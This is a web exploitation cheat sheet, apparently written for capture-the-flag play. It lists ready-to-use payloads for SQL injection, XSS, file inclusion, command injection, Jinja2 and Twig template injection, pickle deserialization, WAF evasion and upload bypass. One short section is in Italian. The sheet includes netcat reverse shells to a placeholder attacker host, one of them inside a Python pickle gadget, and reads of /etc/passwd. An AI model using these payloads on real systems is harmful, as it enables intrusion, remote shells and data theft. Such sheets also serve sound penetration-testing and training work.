# Web Exploitation Cheatsheet

## SQL Injection (SQLi)

### Detection
- `'`
- `"`
- `' OR '1'='1`
- `" OR "1"="1`
- `' OR 1=1 --`
- `admin' --`

### UNION Based
1. **Find number of columns:**
   `ORDER BY 1--`, `ORDER BY 2--`, ... until error.
2. **Find visible column:**
   `UNION SELECT 1, 2, 3--`
3. **Extract Data:**
   `UNION SELECT 1, version(), 3--`
   `UNION SELECT 1, table_name, 3 FROM information_schema.tables--`

### Blind SQLi (Time Based)
- **MySQL:** `1' AND SLEEP(5)--`
- **PostgreSQL:** `1' || pg_sleep(5)--`
- **SQLite:** `1' AND randomblob(100000000)--`

## Cross-Site Scripting (XSS)

### Basic Payloads
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`
- `javascript:alert(1)`

### Bypassing Filters
- Case sensitivity: `<ScRiPt>alert(1)</sCrIpT>`
- Event handlers: `<body onload=alert(1)>`
- SVG: `<svg><script>alert(1)</script>`

## Local File Inclusion (LFI)

### Basic Paths
- `/etc/passwd`
- `../../../../etc/passwd`
- `php://filter/convert.base64-encode/resource=index.php` (Source code disclosure)

## Command Injection (RCE)

### Separators
- `;`
- `|`
- `&&`
- `||`
- `$(command)`
- `` `command` ``

### Payloads
- `; ls -la`
- `; cat /etc/passwd`
- `; nc -e /bin/sh <attacker-ip> <port>` (Reverse Shell)

## Server-Side Template Injection (SSTI)

### Detection
- `{{7*7}}` -> `49`
- `${7*7}` -> `49`
- `{{7*'7'}}` -> `7777777` (Jinja2/Python)

### Jinja2 (Python) RCE
- `{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`
- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
- `{{ ''.__class__.__mro__[1].__subclasses__()[401]("cat flag.txt", shell=True, stdout=-1).communicate() }}` (Index varies)

### Jinja2 Filter Bypass (WAF Evasion)
Se il server blocca caratteri come `_`, `.` o `'`:
1. **Usa `request.args`:** Passa le stringhe proibite via parametri GET.
   - Payload: `{{ request[request.args.c][request.args.i]... }}`
   - URL: `?c=__class__&i=__init__`
2. **Usa `attr()`:** `{{ config|attr(request.args.c) }}`
3. **Hex Encoding:** `\x5f` al posto di `_` (se il filtro è debole).

### Twig (PHP) RCE
- `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

## Insecure Deserialization

### Python (Pickle)
```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ("nc -e /bin/sh ATTACKER_IP PORT",))
print(base64.b64encode(pickle.dumps(RCE())))
```

### PHP
- Look for `unserialize()` on user input.
- Magic methods: `__wakeup`, `__destruct`, `__toString`.
- **PHPGGC**: Use this tool to generate gadget chains.

## WAF Bypass Techniques

### SQL Injection
- **Comments:** `UNION/**/SELECT`
- **Case:** `uNiOn SeLeCt`
- **Encoding:** `%55NION %53ELECT`
- **Whitespace:** `SELECT(user)FROM(users)`
- **Double Encoding:** `%2527` -> `%27` -> `'`

### XSS
- **Tags:** `<svg/onload=...>`, `<body/onload=...>`, `<iframe/onload=...>`
- **Encoding:** `&#x61;lert(1)` (HTML Entity)
- **JS Obfuscation:** `eval(atob('YWxlcnQoMSk='))`

## File Upload Bypass
- **Extensions:** `.php5`, `.phtml`, `.php.jpg`
- **MIME Type:** Change `Content-Type: application/x-php` to `image/jpeg`
- **Magic Bytes:** Add `GIF89a;` at start of file.

